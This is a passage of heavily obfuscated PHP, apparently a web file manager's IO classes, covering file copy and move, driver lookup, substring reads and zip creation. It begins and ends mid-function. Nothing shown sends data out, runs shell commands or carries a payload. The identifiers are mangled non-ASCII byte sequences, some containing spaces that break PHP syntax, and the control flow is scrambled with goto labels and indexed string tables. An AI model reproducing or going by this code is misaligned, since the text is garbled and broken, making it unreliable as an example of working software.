check($Bá˜µÇ½ãª, $cØ™›“”ˆ, $CøŠ¿Ù‹…›, &$Aõ«ŠÕÓê) { $AÏ¡ÏÈ´•Š =& $_SERVER[Šº]; if (self::driverIsSame($Bá˜µÇ½ãª, $CøŠ¿Ù‹…›) && $Bá˜µÇ½ãª->isFolder($cØ™›“”ˆ) && $Bá˜µÇ½ãª->isParentOf($cØ™›“”ˆ, $Aõ«ŠÕÓê)) { show_json(LNG($AÏ¡ÏÈ´•Š[1038]), !1); } if (!$Bá˜µÇ½ãª->exist($cØ™›“”ˆ)) { show_json(LNG($AÏ¡ÏÈ´•Š[105]), !1); } } private static function copyPath($e‘Ô·öÄà, $bÛ¢ÓÓÑ¶ğ, $c®›Êïø, $cÈ‚ïèë…æ, $aæŠ°èšïá, $dÓ¤•æ“·, $B†‡ŒÈƒæà, $fáïŠØÅ©Ÿ = false) { goto E—´ÍÓò‘¤; AÔÆÜ¤‡ÕÑ: if ($B†‡ŒÈƒæà) { return self::copyFile($e‘Ô·öÄà, $bÛ¢ÓÓÑ¶ğ, $c®›Êïø, $cÈ‚ïèë…æ, $a¶˜ï“ï¨ó, $dÓ¤•æ“·); } if ($aæŠ°èšïá == REPEAT_RENAME_FOLDER) { $aæŠ°èšïá = !1; } $A´­Æå™ = rtrim($cÈ‚ïèë…æ, $Aø»‚„ôİî[8]) . $Aø»‚„ôİî[8] . $a¶˜ï“ï¨ó; goto bãƒ›×’ó×; dö»Ï§‚¿…: $dµ°•ƒª¨ = is_array($dµ°•ƒª¨) ? $dµ°•ƒª¨ : array($Aø»‚„ôİî[74] => array(), $Aø»‚„ôİî[75] => array()); $EíÛÍ³¦ãö = array_merge($dµ°•ƒª¨[$Aø»‚„ôİî[74]], $dµ°•ƒª¨[$Aø»‚„ôİî[75]]); foreach ($EíÛÍ³¦ãö as $D«ÂÙ»³) { $B©¢åö²‡ñ = $D«ÂÙ»³[$Aø»‚„ôİî[29]] == $Aø»‚„ôİî[192]; $bÛ¢ÓÓÑ¶ğ = $e‘Ô·öÄà->getPathInner($D«ÂÙ»³[$Aø»‚„ôİî[76]]); $A¯ãÛ½¼Œ = self::copyPath($e‘Ô·öÄà, $bÛ¢ÓÓÑ¶ğ, $c®›Êïø, $cÈ‚ïèë…æ, $aæŠ°èšïá, $dÓ¤•æ“·, $B©¢åö²‡ñ); if (!$A¯ãÛ½¼Œ) { IO::errorTips($Aø»‚„ôİî[1039] . $bÛ¢ÓÓÑ¶ğ . $Aø»‚„ôİî[67] . $cÈ‚ïèë…æ); } } goto aÊÕíÇëï; bãƒ›×’ó×: $bï£ÉŞÒ¥œ = $c®›Êïø->mkdir($c®›Êïø->getPath($A´­Æå™)); $cÈ‚ïèë…æ = $c®›Êïø->getPathInner($bï£ÉŞÒ¥œ); $dµ°•ƒª¨ = $e‘Ô·öÄà->listPath($bÛ¢ÓÓÑ¶ğ, !0); goto dö»Ï§‚¿…; E—´ÍÓò‘¤: $Aø»‚„ôİî =& $_SERVER[Šº]; $a¶˜ï“ï¨ó = $fáïŠØÅ©Ÿ ? $fáïŠØÅ©Ÿ : $e‘Ô·öÄà->pathThis($bÛ¢ÓÓÑ¶ğ); if ($aæŠ°èšïá) { $B§Øšƒª¯Æ = $c®›Êïø->fileNameExist($cÈ‚ïèë…æ, $a¶˜ï“ï¨ó); $a¶˜ï“ï¨ó = $c®›Êïø->fileNameAuto($cÈ‚ïèë…æ, $a¶˜ï“ï¨ó, $aæŠ°èšïá, !$B†‡ŒÈƒæà); $aæŠ°èšïá = $B§Øšƒª¯Æ ? $aæŠ°èšïá : !1; } goto AÔÆÜ¤‡ÕÑ; aÊÕíÇëï: self::copyMoveKeepInfo($e‘Ô·öÄà, $bÛ¢ÓÓÑ¶ğ, $bï£ÉŞÒ¥œ); return $bï£ÉŞÒ¥œ; goto E©£©ÌŒî¬; E©£©ÌŒî¬: } private static function copyFile($Cëœêõ×ÛØ, $B¡§ôã¦£», $E«í£ôôğæ, $B£„¦Çè•, $AÜ•‚ô¬â˜, $cÕë¨ª‡ÙŸ) { goto E‰©Îè¼; d·À µË¹: self::remove($aå“ºİñ¾); Hook::trigger($E¯‹Ö¤×É³[1042], $Cëœêõ×ÛØ, $B¡§ôã¦£», $E«í£ôôğæ, $B£„¦Çè•, $AÜ•‚ô¬â˜, $c£ÀÀ§œ”å); self::copyMoveKeepInfo($Cëœêõ×ÛØ, $B¡§ôã¦£», $c£ÀÀ§œ”å); goto eÉ÷Ñ¾İ«Ü; e«†ŠÇ…Ï¨: if ($GLOBALS[$E¯‹Ö¤×É³[6]][$E¯‹Ö¤×É³[88]][$E¯‹Ö¤×É³[758]]) { $F“‰µ•ì•£ = $GLOBALS[$E¯‹Ö¤×É³[6]][$E¯‹Ö¤×É³[88]][$E¯‹Ö¤×É³[758]]; } $cÕë¨ª‡ÙŸ = !0; $Bí½ªŠØ× = $F“‰µ•ì•£; goto E¡ãŠËà; E‰©Îè¼: $E¯‹Ö¤×É³ =& $_SERVER[Šº]; $B£„¦Çè• = $E«í£ôôğæ->getPath(rtrim($B£„¦Çè•, $E¯‹Ö¤×É³[8]) . $E¯‹Ö¤×É³[8] . $AÜ•‚ô¬â˜); $aÍ»™­Öß  = $E¯‹Ö¤×É³[1040] . time() . rand_string(5); goto E¢‘›Æß; eÉ÷Ñ¾İ«Ü: return $c£ÀÀ§œ”å; goto bÒğ—ÒĞ; E¡ãŠËà: mk_dir($Bí½ªŠØ×); $B”ªîÛº‡® = $Bí½ªŠØ× . $aÍ»™­Öß ; $aå“ºİñ¾ = $B”ªîÛº‡®; goto cÆÉËà÷ÉØ; E¢‘›Æß: Hook::trigger($E¯‹Ö¤×É³[1041], $Cëœêõ×ÛØ, $B¡§ôã¦£», $E«í£ôôğæ, $B£„¦Çè•, $AÜ•‚ô¬â˜, $aÍ»™­Öß ); if (self::driverIsSame($Cëœêõ×ÛØ, $E«í£ôôğæ)) { if ($cÕë¨ª‡ÙŸ) { $c£ÀÀ§œ”å = $E«í£ôôğæ->moveFile($B¡§ôã¦£», $B£„¦Çè•); } else { $c£ÀÀ§œ”å = $E«í£ôôğæ->copyFile($B¡§ôã¦£», $B£„¦Çè•); } Hook::trigger($E¯‹Ö¤×É³[1042], $Cëœêõ×ÛØ, $B¡§ôã¦£», $E«í£ôôğæ, $B£„¦Çè•, $AÜ•‚ô¬â˜, $c£ÀÀ§œ”å); self::copyMoveKeepInfo($Cëœêõ×ÛØ, $B¡§ôã¦£», $c£ÀÀ§œ”å); return $c£ÀÀ§œ”å; } $F“‰µ•ì•£ = TEMP_FILES; goto e«†ŠÇ…Ï¨; cÆÉËà÷ÉØ: $B”ªîÛº‡® = $Cëœêõ×ÛØ->download($B¡§ôã¦£», $B”ªîÛº‡®); $B”ªîÛº‡® = $Cëœêõ×ÛØ->iconvApp($B”ªîÛº‡®); $c£ÀÀ§œ”å = $E«í£ôôğæ->upload($B£„¦Çè•, $B”ªîÛº‡®, $cÕë¨ª‡ÙŸ); goto d·À µË¹; bÒğ—ÒĞ: } private static function copyMoveKeepInfo($AÊ¶ÜÒº‰å, $cáÏØîÏÁ, $CÜö‰¸ĞÏ) { if (!$CÜö‰¸ĞÏ) { return; } $eù”Ô—°Ã = $AÊ¶ÜÒº‰å->info($cáÏØîÏÁ); if (!is_array($eù”Ô—°Ã)) { return; } IO::setModifyTime($CÜö‰¸ĞÏ, $eù”Ô—°Ã[$_SERVER[Šº][84]]); } public static function pathFather($FéÇ£Ö²“È) { $a•¶ùŸŒ—º = IO::init($FéÇ£Ö²“È); $EÉàÃƒ¡í® = $a•¶ùŸŒ—º->pathFather($a•¶ùŸŒ—º->path); return $a•¶ùŸŒ—º->getPathOuter($EÉàÃƒ¡í®); } public static function fileOut($Añ‡ÇÂîÉ², $f±ğÔéÏõ† = false, $dÎçÂØã¢« = false, $fÖÇîâõ½ = '') { $b¡––î‰§‚ = self::driverMake($Añ‡ÇÂîÉ²); if ($b¡––î‰§‚->isFileOutServer()) { return $b¡––î‰§‚->fileOutServer($Añ‡ÇÂîÉ², $f±ğÔéÏõ†, $dÎçÂØã¢«, $fÖÇîâõ½); } return $b¡––î‰§‚->fileOut($Añ‡ÇÂîÉ², $f±ğÔéÏõ†, $dÎçÂØã¢«, $fÖÇîâõ½); } public static function fileOutImage($d°ï¨ÏÔÂß, $A¥™É½ÀÈŞ = 250) { $Eˆğ›ãÜË‰ = array(250, 600, 1200, 3000, 5000); for ($dÛ‰¥–ÆÂá = 0; $dÛ‰¥–ÆÂá < count($Eˆğ›ãÜË‰); $dÛ‰¥–ÆÂá++) { if ($dÛ‰¥–ÆÂá == 0 && $A¥™É½ÀÈŞ <= $Eˆğ›ãÜË‰[$dÛ‰¥–ÆÂá]) { $A¥™É½ÀÈŞ = $Eˆğ›ãÜË‰[$dÛ‰¥–ÆÂá]; break; } else { if ($A¥™É½ÀÈŞ > $Eˆğ›ãÜË‰[$dÛ‰¥–ÆÂá - 1] && $A¥™É½ÀÈŞ <= $Eˆğ›ãÜË‰[$dÛ‰¥–ÆÂá]) { $A¥™É½ÀÈŞ = $Eˆğ›ãÜË‰[$dÛ‰¥–ÆÂá]; break; } else { if ($dÛ‰¥–ÆÂá == count($Eˆğ›ãÜË‰) - 1 && $A¥™É½ÀÈŞ > $Eˆğ›ãÜË‰[$dÛ‰¥–ÆÂá]) { $A¥™É½ÀÈŞ = $Eˆğ›ãÜË‰[$dÛ‰¥–ÆÂá]; break; } } } } $b‡åÎŒ…›á = self::driverMake($d°ï¨ÏÔÂß); if ($b‡åÎŒ…›á->isFileOutServer()) { return $b‡åÎŒ…›á->fileOutImageServer($d°ï¨ÏÔÂß, $A¥™É½ÀÈŞ); } return $b‡åÎŒ…›á->fileOutImage($d°ï¨ÏÔÂß, $A¥™É½ÀÈŞ); } private static function driverIsSame($dŸÑÖÙ‰Á, $Eˆ…£¯¦¿’) { goto c‘‹ÈŠÊò¯; c±øÅ÷Í: if ($aÍÕµˆÇ¼ != $C¡—ÒÔ‡‰) { return !1; } if ($aÍÕµˆÇ¼ == $fƒŞ„™¨Úä[716]) { return !0; } if ($aÍÕµˆÇ¼ == $fƒŞ„™¨Úä[106]) { return !0; } goto B†èöÒˆ¼¨; B†èöÒˆ¼¨: if ($dŸÑÖÙ‰Á->pathDriver == $Eˆ…£¯¦¿’->pathDriver) { return !0; } return !1; goto D«â¼Ûó¬; c‘‹ÈŠÊò¯: $fƒŞ„™¨Úä =& $_SERVER[Šº]; $aÍÕµˆÇ¼ = $dŸÑÖÙ‰Á->getType(); $C¡—ÒÔ‡‰ = $Eˆ…£¯¦¿’->getType(); goto c±øÅ÷Í; D«â¼Ûó¬: } public static function copyUpdate($a•â¸È Òé, $e´‰éà­ÚÁ) { goto bˆ‘Û‡¶Ÿ‡; f‹ºÏù¸×: Hook::trigger($DÆõéÏá‰[1046], $a•â¸È Òé, $e´‰éà­ÚÁ, $FõÁ’ª°…ø); foreach ($F¸‰èÅ§‰ as $FÍ•‚Í’«¹) { IO::mkdir($FÍ•‚Í’«¹); } foreach ($d›Ôô¯ˆ£› as $FÍ•‚Í’«¹) { IO::copy($FÍ•‚Í’«¹[$DÆõéÏá‰[1043]], $FÍ•‚Í’«¹[$DÆõéÏá‰[1044]], REPEAT_REPLACE); } goto CÏìˆ—š’ì; bˆ‘Û‡¶Ÿ‡: $DÆõéÏá‰ =& $_SERVER[Šº]; if (!IO::exist($a•â¸È Òé)) { return !1; } if (!IO::exist($e´‰éà­ÚÁ)) { IO::mkdir($e´‰éà­ÚÁ); } goto CîĞç‰Œ¿; eœìåªˆ†ª: $F¸‰èÅ§‰ = array(); foreach ($CÜ’ÁÑ…¤ğ as $Bª·Åíö¾’ => $FÍ•‚Í’«¹) { if (isset($BÄâ°Å»ˆÚ[$Bª·Åíö¾’])) { if ($FÍ•‚Í’«¹[$DÆõéÏá‰[77]] == 1) { continue; } if ($BÄâ°Å»ˆÚ[$Bª·Åíö¾’][$DÆõéÏá‰[78]] == $FÍ•‚Í’«¹[$DÆõéÏá‰[78]]) { continue; } } if ($FÍ•‚Í’«¹[$DÆõéÏá‰[77]] == 1) { $F¸‰èÅ§‰[] = $e´‰éà­ÚÁ . $DÆõéÏá‰[8] . $Bª·Åíö¾’; continue; } $CÂ­¶ÑÑ†£ = strstr(trim($Bª·Åíö¾’, $DÆõéÏá‰[8]), $DÆõéÏá‰[8]) ? get_path_father($Bª·Åíö¾’) : $DÆõéÏá‰[33]; $d›Ôô¯ˆ£›[] = array($DÆõéÏá‰[1043] => $FÍ•‚Í’«¹[$DÆõéÏá‰[76]], $DÆõéÏá‰[1044] => rtrim($e´‰éà­ÚÁ, $DÆõéÏá‰[8]) . $DÆõéÏá‰[8] . $CÂ­¶ÑÑ†£, $DÆõéÏá‰[1045] => $FÍ•‚Í’«¹); } $FõÁ’ª°…ø = array($DÆõéÏá‰[192] => $d›Ôô¯ˆ£›, $DÆõéÏá‰[77] => $F¸‰èÅ§‰); goto f‹ºÏù¸×; CîĞç‰Œ¿: $CÜ’ÁÑ…¤ğ = self::_listAll($a•â¸È Òé); $BÄâ°Å»ˆÚ = self::_listAll($e´‰éà­ÚÁ); $d›Ôô¯ˆ£› = array(); goto eœìåªˆ†ª; CÏìˆ—š’ì: } private static function _listAll($aã£ÈòùÏ) { $bğìºßá³æ =& $_SERVER[Šº]; $aã£ÈòùÏ = KodIO::clear($aã£ÈòùÏ); $Bæ‹¦…¯¯ˆ = IO::listAll($aã£ÈòùÏ); foreach ($Bæ‹¦…¯¯ˆ as &$cš´ØÃ—Â¡) { $BÉè£ñ‹µ— = substr($cš´ØÃ—Â¡[$bğìºßá³æ[76]], strlen($aã£ÈòùÏ)); $cš´ØÃ—Â¡[$bğìºßá³æ[1047]] = trim($BÉè£ñ‹µ—, $bğìºßá³æ[8]); } unset($cš´ØÃ—Â¡); return array_to_keyvalue($Bæ‹¦…¯¯ˆ, $bğìºßá³æ[1047]); } public static function fileSubstr($CÌáºù­øª, $BáÊí˜æÈµ, $BàÄÇêÉ¤Ù = false) { goto B†æœ¨ÇŒ; f‡÷ÊŸ˜ìÕ: $A¸«·†ù´œ = $BáÊí˜æÈµ; $A„ÜŞÓ«éÁ = $BàÄÇêÉ¤Ù; if ($BáÊí˜æÈµ < 0) { $BáÊí˜æÈµ = $d‘ç‚‡óÎ + $BáÊí˜æÈµ; } goto c‚íã¤·Îã; B†æœ¨ÇŒ: $aÓ×öåÊ±Ù =& $_SERVER[Šº]; $E¤†Ä¯Ï¼µ = self::driverMake($CÌáºù­øª); $d‘ç‚‡óÎ = $E¤†Ä¯Ï¼µ->size($CÌáºù­øª); goto f‡÷ÊŸ˜ìÕ; cÜƒë°§Õî: if ($BàÄÇêÉ¤Ù <= 0) { return $aÓ×öåÊ±Ù[33]; } if ($BáÊí˜æÈµ < 0 || $BáÊí˜æÈµ >= $d‘ç‚‡óÎ || $BàÄÇêÉ¤Ù > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\x65\x52\145\141\144\x20\x65\162\x72\x6f\x72\x21\40\163\x74\141\x72\164\x3d{$BáÊí˜æÈµ}\73\154\145\156\x67\x74\x68\75{$BàÄÇêÉ¤Ù}\x3b\40\x73\x69\x7a\x65\x3d{$d‘ç‚‡óÎ}\73"); } $Eëßâ‘ñ‹µ = $E¤†Ä¯Ï¼µ->fileSubstr($CÌáºù­øª, $BáÊí˜æÈµ, $BàÄÇêÉ¤Ù); goto fõÑÙ³‰Æ; fõÑÙ³‰Æ: if (!$Eëßâ‘ñ‹µ && $BàÄÇêÉ¤Ù && isset($GLOBALS[$aÓ×öåÊ±Ù[1050]])) { throw new Exception($GLOBALS[$aÓ×öåÊ±Ù[1050]][$aÓ×öåÊ±Ù[1051]]); } return $Eëßâ‘ñ‹µ; goto cœÙíõ¦; c‚íã¤·Îã: if ($BàÄÇêÉ¤Ù === !1) { $BàÄÇêÉ¤Ù = $d‘ç‚‡óÎ - $BáÊí˜æÈµ; } if ($BáÊí˜æÈµ + $BàÄÇêÉ¤Ù > $d‘ç‚‡óÎ) { $BàÄÇêÉ¤Ù = $d‘ç‚‡óÎ - $BáÊí˜æÈµ; } if (!$d‘ç‚‡óÎ && $E¤†Ä¯Ï¼µ->getType() == $aÓ×öåÊ±Ù[106] && !$E¤†Ä¯Ï¼µ->exist($CÌáºù­øª)) { throw new Exception($aÓ×öåÊ±Ù[1048] . LNG($aÓ×öåÊ±Ù[1049]) . $aÓ×öåÊ±Ù[912] . get_path_this($CÌáºù­øª) . $aÓ×öåÊ±Ù[33]); } goto cÜƒë°§Õî; cœÙíõ¦: } private static function driverMake(&$dóŒÌè­å³) { goto A»¦·ßùôÀ; A¸¸²Ÿ‚Õ: return $c‘ò›…àŠæ; goto Cí™‚èÁÎë; e‡–÷Ù„ìß: if ($D£›ØË•Œ‚[$FĞ´²¬«¼[29]] == KodIO::KOD_IO && !self::$driverListSystem[$D£›ØË•Œ‚[$FĞ´²¬«¼[392]]]) { return !1; } $dóŒÌè­å³ = $D£›ØË•Œ‚[$FĞ´²¬«¼[1052]]; $c‘ò›…àŠæ = self::driverGet($D£›ØË•Œ‚, $dóŒÌè­å³); goto A¸¸²Ÿ‚Õ; A»¦·ßùôÀ: $FĞ´²¬«¼ =& $_SERVER[Šº]; $D£›ØË•Œ‚ = KodIO::parse($dóŒÌè­å³); if (!self::$driverListSystem) { $F×Àôï¢ŞĞ = Model($FĞ´²¬«¼[725])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($F×Àôï¢ŞĞ, $FĞ´²¬«¼[392]); } goto e‡–÷Ù„ìß; Cí™‚èÁÎë: } private static function driverGet($CíâÛ„æòî, &$d‹¼‘’íÜ) { goto fôÚ¾ØÑƒŒ; dôÂŠÚÁ„ˆ: $eÌ®µÂ–Š->path = $d‹¼‘’íÜ; return $eÌ®µÂ–Š; goto a¶ºà‡§É; B»¾¶âÊ÷í: $eÌ®µÂ–Š = self::$driverCache[$AŞ†‡¹Ìá¥]; $eÌ®µÂ–Š->pathDriver = $Då“ÏÀ„áé; $eÌ®µÂ–Š->pathBase = $Cµ’ÌÈŸïâ[33]; goto Dˆ—öëè; bŞÆÂÕŠã: switch ($CíâÛ„æòî[$Cµ’ÌÈŸïâ[29]]) { case KodIO::KOD_IO: $F¿…²Şßñ = self::$driverListSystem[$f‘¿’Á¹è]; break; case KodIO::KOD_SOURCE: $d‹¼‘’íÜ = $f‘¿’Á¹è . $d‹¼‘’íÜ; $F¿…²Şßñ = array($Cµ’ÌÈŸïâ[1054] => $Cµ’ÌÈŸïâ[1055], $Cµ’ÌÈŸïâ[6] => $CíâÛ„æòî); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $E‡ç†‘ÚÒ = $GLOBALS[$Cµ’ÌÈŸïâ[1056]]; self::$driverListUser = array_to_keyvalue($E‡ç†‘ÚÒ, $Cµ’ÌÈŸïâ[392]); } $F¿…²Şßñ = self::$driverListUser[$f‘¿’Á¹è]; break; case KodIO::KOD_SHARE_LINK: $F¿…²Şßñ = array($Cµ’ÌÈŸïâ[1054] => $Cµ’ÌÈŸïâ[1057], $Cµ’ÌÈŸïâ[6] => $CíâÛ„æòî); $AËùõ§Ò¾ = Action($Cµ’ÌÈŸïâ[1058])->sharePathInfo($CíâÛ„æòî[$Cµ’ÌÈŸïâ[76]]); $d‹¼‘’íÜ = $AËùõ§Ò¾[$Cµ’ÌÈŸïâ[403]]; if (!$AËùõ§Ò¾[$Cµ’ÌÈŸïâ[403]]) { $aÁàó„â—ñ = Model($Cµ’ÌÈŸïâ[571])->getInfo($AËùõ§Ò¾[$Cµ’ÌÈŸïâ[475]]); $d‹¼‘’íÜ = KodIO::clear($aÁàó„â—ñ[$Cµ’ÌÈŸïâ[1059]] . $CíâÛ„æòî[$Cµ’ÌÈŸïâ[1052]]); $CíâÛ„æòî[$Cµ’ÌÈŸïâ[473]] = $aÁàó„â—ñ; $CíâÛ„æòî[$Cµ’ÌÈŸïâ[1036]] = $d‹¼‘’íÜ; $F¿…²Şßñ = array($Cµ’ÌÈŸïâ[1054] => $Cµ’ÌÈŸïâ[1060], $Cµ’ÌÈŸïâ[6] => $CíâÛ„æòî); } break; case KodIO::KOD_SHARE_ITEM: $F¿…²Şßñ = array($Cµ’ÌÈŸïâ[1054] => $Cµ’ÌÈŸïâ[1061], $Cµ’ÌÈŸïâ[6] => $CíâÛ„æòî); $aÁàó„â—ñ = Model($Cµ’ÌÈŸïâ[571])->getInfo($CíâÛ„æòî[$Cµ’ÌÈŸïâ[392]]); if ($aÁàó„â—ñ[$Cµ’ÌÈŸïâ[403]] == $Cµ’ÌÈŸïâ[504]) { $d‹¼‘’íÜ = KodIO::clear($aÁàó„â—ñ[$Cµ’ÌÈŸïâ[1059]] . $CíâÛ„æòî[$Cµ’ÌÈŸïâ[1052]]); $CíâÛ„æòî[$Cµ’ÌÈŸïâ[473]] = $aÁàó„â—ñ; $CíâÛ„æòî[$Cµ’ÌÈŸïâ[1036]] = $d‹¼‘’íÜ; $F¿…²Şßñ = array($Cµ’ÌÈŸïâ[1054] => $Cµ’ÌÈŸïâ[1062], $Cµ’ÌÈŸïâ[6] => $CíâÛ„æòî); } else { if (!$d‹¼‘’íÜ) { $d‹¼‘’íÜ = $aÁàó„â—ñ[$Cµ’ÌÈŸïâ[403]]; } } break; default: $d‹¼‘’íÜ = $CíâÛ„æòî[$Cµ’ÌÈŸïâ[76]]; $F¿…²Şßñ = array($Cµ’ÌÈŸïâ[1054] => $Cµ’ÌÈŸïâ[1063]); break; } $AŞ†‡¹Ìá¥ = $CíâÛ„æòî[$Cµ’ÌÈŸïâ[76]]; if (!isset(self::$driverCache[$AŞ†‡¹Ìá¥])) { $B¤—±ó‹ = strtolower($F¿…²Şßñ[$Cµ’ÌÈŸïâ[94]]); $eëğ»ÙŞ = $GLOBALS[$Cµ’ÌÈŸïâ[6]][$Cµ’ÌÈŸïâ[88]][$Cµ’ÌÈŸïâ[789]]; $FÂ¨‘Û †ª = $Cµ’ÌÈŸïâ[72] . (isset($eëğ»ÙŞ[$B¤—±ó‹]) ? $eëğ»ÙŞ[$B¤—±ó‹] : ucfirst($B¤—±ó‹)); if (!class_exists($FÂ¨‘Û †ª)) { show_json("{$FÂ¨‘Û †ª}\40\156\157\x74\x20\x65\x78\151\163\164\163\41", !1); } $f¹¨ˆÚ¾ô¨ = isset($F¿…²Şßñ[$Cµ’ÌÈŸïâ[6]]) ? $F¿…²Şßñ[$Cµ’ÌÈŸïâ[6]] : !1; self::$driverCache[$AŞ†‡¹Ìá¥] = new $FÂ¨‘Û †ª($f¹¨ˆÚ¾ô¨); } goto B»¾¶âÊ÷í; Dˆ—öëè: if (isset($F¿…²Şßñ[$Cµ’ÌÈŸïâ[6]][$Cµ’ÌÈŸïâ[1064]])) { $eÌ®µÂ–Š->pathBase = rtrim($F¿…²Şßñ[$Cµ’ÌÈŸïâ[6]][$Cµ’ÌÈŸïâ[1064]], $Cµ’ÌÈŸïâ[8]) . $Cµ’ÌÈŸïâ[8]; $d‹¼‘’íÜ = $eÌ®µÂ–Š->pathBase . ltrim($d‹¼‘’íÜ, $Cµ’ÌÈŸïâ[8]); } $d‹¼‘’íÜ = $eÌ®µÂ–Š->getPath($d‹¼‘’íÜ); if (isset($CíâÛ„æòî[$Cµ’ÌÈŸïâ[1036]])) { $d‹¼‘’íÜ = $CíâÛ„æòî[$Cµ’ÌÈŸïâ[1036]]; } goto dôÂŠÚÁ„ˆ; fôÚ¾ØÑƒŒ: $Cµ’ÌÈŸïâ =& $_SERVER[Šº]; $Då“ÏÀ„áé = $CíâÛ„æòî[$Cµ’ÌÈŸïâ[1053]]; $f‘¿’Á¹è = $CíâÛ„æòî[$Cµ’ÌÈŸïâ[392]]; goto bŞÆÂÕŠã; a¶ºà‡§É: } public static function errorTips($Déæ‘Ìç = false) { goto BĞªê²Æ½; BçéÃÀ‚ãÓ: if ($Déæ‘Ìç === -1) { return $A­á‹×Æ»à ? $A­á‹×Æ»à[count($A­á‹×Æ»à) - 1] : $bùƒù…¢Èê[33]; } if ($Déæ‘Ìç === !1) { return implode($bùƒù…¢Èê[228], $A­á‹×Æ»à); } if (count($A­á‹×Æ»à) >= $Aáô„™Ìî­) { $A­á‹×Æ»à = array_slice($A­á‹×Æ»à, $Aáô„™Ìî­ * 0.5, $Aáô„™Ìî­); } goto A‘§Ÿç‹¢; BĞªê²Æ½: $bùƒù…¢Èê =& $_SERVER[Šº]; static $A­á‹×Æ»à = array(); $Aáô„™Ìî­ = 1000; goto BçéÃÀ‚ãÓ; A‘§Ÿç‹¢: $A­á‹×Æ»à[] = $Déæ‘Ìç; write_log($bùƒù…¢Èê[160] . ACTION . $bùƒù…¢Èê[1065] . $Déæ‘Ìç, $bùƒù…¢Èê[1066]); goto Dç…Ä½æÉ; Dç…Ä½æÉ: } public static function getLastError($b»±ğŸ‡…Ğ = '') { $E’‘†ô‹ë = self::errorTips(-1); return $E’‘†ô‹ë ? $E’‘†ô‹ë : $b»±ğŸ‡…Ğ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $CÒÅ¬‚î©ì; if (!$CÒÅ¬‚î©ì) { $dÛ»£ğö¨„ = IO::init($_SERVER[Šº][8]); } return $dÛ»£ğö¨„; } private static function iconvSystem($fªæ““¥‘) { return self::local()->iconvSystem($fªæ““¥‘); } private static function iconvApp($Dö®õİìÊŒ) { return self::local()->iconvApp($Dö®õİìÊŒ); } public static function zip($cŸ•£Õ§‡ë, $A•ŸĞÎ÷¤ò = "\172\x69\x70", $cé ÂŸĞ = '', $a›ÁƒŒšãÛ = REPEAT_RENAME) { goto D•«¶¤¥À; FŒÕîò¶¸à: if ($cé ÂŸĞ || !$e½ØŸ­™í¦) { if ($e½ØŸ­™í¦ && strstr($e½ØŸ­™í¦, TEMP_FILES)) { $eã¦Ğƒ‡Öù = $dˆ‰¥¹ÑŞ‡ = array(); recursion_dir($AÎ‚µÍÀßŠ, $eã¦Ğƒ‡Öù, $dˆ‰¥¹ÑŞ‡, 0); foreach ($eã¦Ğƒ‡Öù as $aè¥«¦ğ¹) { del_dir($aè¥«¦ğ¹); } foreach ($dˆ‰¥¹ÑŞ‡ as $fà£Æè·ê¸) { if ($fà£Æè·ê¸ == $f«ñâéæÕ’) { continue; } del_file($fà£Æè·ê¸); } } return $aô“Ôç±´; } $e‰²íêË“ = self::pathFather($fï‘¹êÖ†Ô[$FùÄâøÅ[76]]); $BØ­‡«ª« = self::move($aô“Ôç±´, $e‰²íêË“, $a›ÁƒŒšãÛ); goto c£ñÛáğÇ; c£ñÛáğÇ: if (!$BØ­‡«ª«) { del_dir($e½ØŸ­™í¦); show_json(LNG($FùÄâøÅ[1069]), !1); } del_dir($e½ØŸ­™í¦); return $BØ­‡«ª«; goto D²¶ø·á; AÀï‘ÏËÒ¢: if (count($dˆ‰¥¹ÑŞ‡) > 1) { $cÛñÍøÀÛ = IO::info(IO::pathFather($fï‘¹êÖ†Ô[$FùÄâøÅ[76]])); $F ôìíÆòë = $cÛñÍøÀÛ[$FùÄâøÅ[28]]; } $AÎ‚µÍÀßŠ = $e½ØŸ­™í¦; if (!$AÎ‚µÍÀßŠ) { $AÎ‚µÍÀßŠ = get_path_father($fï‘¹êÖ†Ô[$FùÄâøÅ[76]]); if (!$cé ÂŸĞ && $aâ´‹ÛÉÄª->getType() == $FùÄâøÅ[106]) { $AÎ‚µÍÀßŠ = get_path_father($aâ´‹ÛÉÄª->path); } $Eøºàè® = IO::info($AÎ‚µÍÀßŠ); if (!$Eøºàè®[$FùÄâøÅ[195]]) { show_json(LNG($FùÄâøÅ[1068]), !1); } } goto bÔôÁ—òã; cêÑµŸÎĞÖ: foreach ($dˆ‰¥¹ÑŞ‡ as $e·À‹Û•èÏ => $CŠÃ¹””¦…) { $dˆ‰¥¹ÑŞ‡[$e·À‹Û•èÏ] = self::iconvSystem($CŠÃ¹””¦…); } KodArchive::create($f«ñâéæÕ’, $dˆ‰¥¹ÑŞ‡); if (!IO::exist($aô“Ôç±´)) { if ($e½ØŸ­™í¦) { del_dir($e½ØŸ­™í¦); } show_json(LNG($FùÄâøÅ[1069]), !1); } goto FŒÕîò¶¸à; bÔôÁ—òã: $aô“Ôç±´ = $AÎ‚µÍÀßŠ . $F ôìíÆòë . $FùÄâøÅ[95] . $A•ŸĞÎ÷¤ò; $aô“Ôç±´ = get_filename_auto($aô“Ôç±´, $FùÄâøÅ[33], $a›ÁƒŒšãÛ); $f«ñâéæÕ’ = self::iconvSystem($aô“Ôç±´); goto cêÑµŸÎĞÖ; e²ªÁì¦Ä‰: $e½ØŸ­™í¦ = !1; if (!$cé ÂŸĞ && $aâ´‹ÛÉÄª->getType() == $FùÄâøÅ[106]) { $dˆ‰¥¹ÑŞ‡ = self::zipFileList($cŸ•£Õ§‡ë); } else { $e½ØŸ­™í¦ = $cé ÂŸĞ ? $cé ÂŸĞ : TEMP_FILES . $FùÄâøÅ[1067] . time() . rand_string(8) . $FùÄâøÅ[8]; mk_dir($e½ØŸ­™í¦); $dˆ‰¥¹ÑŞ‡ = self::zipFileList($cŸ•£Õ§‡ë, $e½ØŸ­™í¦); } $F ôìíÆòë = $fï‘¹êÖ†Ô[$FùÄâøÅ[28]]; goto AÀï‘ÏËÒ¢; D•«¶¤¥À: $FùÄâøÅ =& $_SERVER[Šº]; $aâ´‹ÛÉÄª = self::init($cŸ•£Õ§‡ë[0][$FùÄâøÅ[76]]); $fï‘¹êÖ†Ô = self::info($cŸ•£Õ§‡ë[0][$FùÄâøÅ[76]]); goto e²ªÁì¦Ä‰; D²¶ø·á: } public static function unzip($f½„¤¥š¿Ş, $BÃë±è¸óÈ = 